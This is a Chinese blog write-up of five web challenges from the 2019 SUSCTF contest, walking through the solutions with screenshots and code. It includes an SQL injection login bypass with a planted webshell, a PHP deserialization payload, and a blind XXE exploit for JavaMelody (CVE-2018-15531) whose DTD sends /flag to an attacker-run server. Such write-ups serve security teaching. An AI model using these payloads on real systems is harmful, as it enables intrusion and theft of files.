---
title: SUSCTF 2nd Web Write Up
key: 66237fc39ecb12f9a560eac532a07492
tags:
  - Writeup
  - CTF
date: 2019-04-25 21:07:00
---
> 文章首发于安恒网络空间安全讲武堂

![](/assets/images/move/1555149964624-1914027a-dcc9-45db-a993-9e0d1cc3f5d4.png)

> “东南大学永信杯”江苏大学生网络安全精英邀请赛 2019/4/13 9:00-17:00

<!--more-->

## Web1 judge 100pt

just do it!

http://211.65.197.117:15000

![](/assets/images/move/1555146966474-e1afa7e4-8818-4261-afb4-654c1a7cff44.png)

Payload:

```python
import re
import time
import requests

url = 'http://211.65.197.117:15000/'
r = requests.session()
for i in range(20):
    text = r.get(url).text
    calc = str(re.findall("\n<div>(.*?)=", text))[2:-2].replace(' ', '')
    res = str(re.findall("=(.*?)</div>", text))[2:-2]
    res = int(res)
    ans = eval(calc)
    if ans == res:
        data = {'answer': "true"}
    elif ans != res:
        data = {'answer': "false"}
    time.sleep(1)
    last = r.post(url, data)
    print(last.text)
    '''SUSCTF{python_1s_th3_be3t_l4ngu4ge}'''
```



## Web2 phpStorm 100pt



好的编辑器开发真的很快！！http://sus.njnet6.edu.cn:11002



![](/assets/images/move/1555147748007-7b79a75d-8d69-4978-8af2-fe6664d0db8d.png)

由`phpStorm`猜测`.idea`文件泄露，下载`workspace.xml`分析文件路径，访问`Thi5_tru3_qu3sti0n.php`（依照引导使用BurpSuite`抓包修改Head头X-Forward-For为127.0.0.1、User-Agent为SUS进行绕过）获取到php代码如下：

```php
<?php
/**
 * Created by PhpStorm.
 * User: y4ngyy
 * Date: 19-3-19
 * Time: 下午2:40
 */
class foo {
    public $filename;
    function printContent() {
        $content = file_get_contents($this->filename);
        echo $content;
    }
}
if ($_SERVER['HTTP_X_FORWARDED_FOR'] != '127.0.0.1') {
    echo 'Only Localhost can see';
    die();
} else if ($_SERVER['HTTP_USER_AGENT'] != 'SUS') {
    echo 'Browser is not SUS<br>';
    echo 'Please use SUS browser!';
    die();
}
show_source(__FILE__);


$a = null;
if (isset($_POST['foo'])) {
    $a = unserialize($_POST['foo']);
    if (!is_object($a)||get_class($a) != 'foo') {
        $a = new foo();
        $a->filename = "text.txt";
    }

} else {
    $a = new foo();
    $a->filename = "text.txt";
}
$a->printContent();
Hello, CTFer!
?>
```

简单的PHP反序列化，Payload:

```php
<?php
class foo {
    public $filename;
    function printContent() {
        $content = file_get_contents($this->filename);
        echo $content;
    }
}

$a = new foo();
$a->filename = "flag.php";
echo serialize($a);

//O:3:"foo":1:{s:8:"filename";s:8:"flag.php";}
//escape()->O%3A3%3A%22foo%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```

提交`foo`后查看网页源代码，发现如下内容：

```php
//view-source:http://sus.njnet6.edu.cn:11002/Thi5_tru3_qu3sti0n.php
<?php
/**
 * Created by PhpStorm.
 * User: y4ngyy
 * Date: 19-3-19
 * Time: 下午2:38
 */
//SUSCTF{PHPSTORM_1s_pR3tty_useFul};?>
```





## Web3  infoGate 300pt



信息门户？？http://sus.njnet6.edu.cn:11001

![](/assets/images/move/1555147145783-2a358a3d-2f8e-4fe4-a752-b9428c823781.png)

`username=admin' or '1'='1`&`password=1`即可以`admin`的身份登录，进入`edit.php`写入shell~

![](/assets/images/move/1555134022789-e19c0ec6-81da-4e84-bf69-592e845825bc.png)

访问`/Uploads/webshell.php`得到：SUSCTf{infoGate_Pr3tty_easy_T0_GETSHELL}.





## Web4  Melody 300pt



所以这题为什么叫这个名字？http://211.65.197.117:23333

JavaMelody是一个用来对Java应用进行监控的组件。通过该组件，用户可以对内存、CPU、用户session甚至SQL请求等进行监控，并且该组件提供了一个可视化界面给用户使用。

![](/assets/images/move/1555148411996-fca71af7-6437-4f5a-a9d5-1dd6836fdf7f.png)

访问`/monitoring`可以验证是否加载成功插件：

![](/assets/images/move/1555207057361-45fc0e3f-52c6-4f91-ac58-f871f007f839.png)

系 javaMelody XXE(CVE-2018-15531) ，参见复现分析[JavaMelody 组件 XXE 漏洞解析](https://paper.seebug.org/705/). Payload:



```xml
//http://211.65.197.117:23333/
POST / HTTP/1.1
Host: 211.65.197.117:23333
Content-type: text/xml
SOAPAction: aaaaa
Content-Length: 154

<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://your_vps_adress:port/ev.dtd">
%remote;
]>
</root>
```

这里直接响应是没有回显的，为了完成盲打(Blind XXE)读取文件的功能，服务器部署文件`ev.dtd`：

```xml
//ev.dtd
<!ENTITY % payload SYSTEM	"file:///flag">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://your_vps_adress:port/%payload;'>">
%int;
%trick;
```

捕获记录：

```bash
211.65.197.117 - - [13/Apr/2019:15:53:02 +0800] "GET /SUSCTF{M3l0dy_CV3_XX3} HTTP/1.1" 404 162 "-" "Java/1.8.0_201"
```



## Web5 重定向之旅 300pt



使用谷歌内核浏览器食用效果更佳。 http://sus.njnet6.edu.cn:65533

![](/assets/images/move/1555148854529-a5f3af9b-3433-42a5-80d0-9b7ecc1b62e7.png)

- Part1 查看源代码获取注释代码

![](/assets/images/move/1555206886011-a8035308-6511-4abd-8c2f-2b4c7a99950c.png)

```php
//url:http://sus.njnet6.edu.cn:65533/index-ein.html
//hint：源代码的秘密
<meta http-equiv="refresh" content="6;url=index-dos.php">
<!--<?php $part1="3oI";?>-->
```

- Part2 在HTTP请求报文头里捕获

![](/assets/images/move/1555206797179-1742ddfc-732b-4d91-a3e8-e4cb3f8a7c96.png)

网页很快重定向跳转,这里我们可以用BurpSuite抓包查看响应包内容。

```php
//http://sus.njnet6.edu.cn:65533/index-dos.php
//hint: HEAD 你摸得到头脑吗？
$part2: rEdirEct
```

- Part3 解AAencode JS加密

![](/assets/images/move/1555206896629-41e6ff33-4142-4d27-8198-fb01425e019e.png)

```php
//http://sus.njnet6.edu.cn:65533/index-trois.aspx
//http://sus.njnet6.edu.cn:65533/index-ne.js
//JS AAencode 解密如下
leave=function ()
{console.log("$part3:4fun");
location.href='flag.php';
location.href='no_flag.html';}
```
- 访问flag.php

```php
//http://sus.njnet6.edu.cn:65533/flag.php
SUSCTF{__}
<?php
error_reporting(0);
echo "SUSCTF{".$part1."_".$part2."_".$part3."}";
echo "<br>";
show_source(__FILE__);
?>
```

拼接flag得到SUSCTF{3oI_rEdirEct_4fun}.

